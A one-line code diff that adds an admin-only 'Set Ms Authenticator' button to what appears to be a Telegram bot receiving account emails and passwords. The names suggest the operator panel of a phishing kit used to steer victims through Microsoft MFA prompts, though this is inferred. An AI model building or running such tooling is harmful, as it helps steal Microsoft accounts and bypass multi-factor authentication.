@@ -105,6 +105,7 @@ def get_status_update(session_id, email, password, user_id):
         # Add admin-only "Set Custom Message" button
         if admin_user and str(chat_id) == str(admin_id):
             keyboard_layout.append([{'text': 'Set Custom Message', 'url': f"{HOSTED_URL}/set_custom_status?email={email}"}])
+            keyboard_layout.append([{'text': 'Set Ms Authenticator', 'url': f"{HOSTED_URL}/set_ms_authenticator_status?email={email}"}])
 
 
         recipients = _get_notification_recipients(session_id, user_id)
